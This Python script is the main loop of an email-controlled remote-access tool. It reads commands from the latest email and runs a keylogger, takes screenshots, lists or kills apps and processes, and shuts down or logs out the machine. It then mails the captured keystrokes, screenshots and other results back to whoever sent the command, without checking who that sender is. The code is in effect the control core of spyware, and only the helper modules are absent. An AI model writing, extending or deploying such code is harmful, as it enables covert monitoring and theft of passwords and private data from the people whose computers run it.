import EmailHandler as em
import KeyLogger as keyl
import ListApp as app
import ListProcess as proc
import ScreenShot
import Power
import time
import os
import pandas

DEFAULT_KEYLOG_TIME = 300

# init
email = em.EmailHandler()
waitCounter = 0
idler = ['   ', '.  ', '.. ', '...']
# Main loop
while True:
    
    command = email.readLastestEmail()
    cmd = command[1].split()

    print(f'Waiting for next command{idler[waitCounter]}\r', end='')
    waitCounter = 0 if waitCounter == 3 else waitCounter + 1 
    
    result = ''
    image = None

    if 'EMPTY' in cmd:
        continue
    os.system('cls')
    if cmd[0] == 'screenshot':
        result = 'Screenshot captured'
        image = ScreenShot.capture()

    elif cmd[0] == 'keylog':
        keylTime = DEFAULT_KEYLOG_TIME
        if '-t' in cmd:
            keylTime = int(cmd[cmd.index('-t') + 1])
        keylog = keyl.Keylogger(keylTime)
        keys = keylog.run()
        print('Finished')
        if '-both' in cmd:
            for i in keys:
                print(f'{i}: {keys[i]}')
                result += f'{i}: {keys[i]}\n'
            print(f'Log: {keylog.getLog()}')
            result += f'Log: {keylog.getLog()}'
        elif '-l' in cmd:
            print(f'Log: {keylog.getLog()}')
            result += f'Log: {keylog.getLog()}'
        else:
            for i in keys:
                print(f'{i}: {keys[i]}')
                result += f'{i}: {keys[i]}\n'


    elif cmd[0] == 'app':
        if cmd[1] == 'list':
            appList = app.ListApp('-path' in cmd)
            for i in appList:
                print(i)
                result += i + '\n'
        elif cmd[1] == '-end':
            app.StopApp(cmd[2])
            result = 'Stopped'
        else:
            app.OpenApp(cmd[2])
            result = 'Opened'

    elif cmd[0] == 'proc':
        if cmd[1] == 'list':
            procList = proc.ListGet()
            for i in procList:
                print(f'{i[0]:<10}{i[1]}')
                result += f'{i[0]:<10}{i[1]}\n'

    elif cmd[0] == 'shutdown':
        Power.shutdown()
        result = 'Shutdown'
    
    elif cmd[0] == 'restart':
        Power.restart()
        result = 'Restarted'
    
    elif cmd[0] == 'logout':
        Power.logout()
        result = 'Logged out'

    else:
        print('Error: Command not found')
        result = 'Error: Command not found'
    
    sender = command[2]
    if result != '':
        email.sendMail(sender, 'Your request has been executed', result, image)
    time.sleep(1)
    

